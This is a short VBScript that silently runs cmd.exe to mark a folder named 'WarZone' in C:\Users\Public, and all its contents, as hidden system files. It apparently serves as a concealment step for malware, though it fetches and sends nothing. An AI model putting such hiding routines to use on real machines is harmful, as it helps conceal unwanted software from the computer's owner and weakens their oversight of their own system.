set oShell = Wscript.CreateObject("Wscript.Shell")
' Hide WarZone Folder
oShell.Run "cmd.exe /c attrib +s +h ""C:\Users\Public\WarZone"" & attrib +s +h -r ""C:\Users\Public\WarZone\*.*"" /s /d",0,True
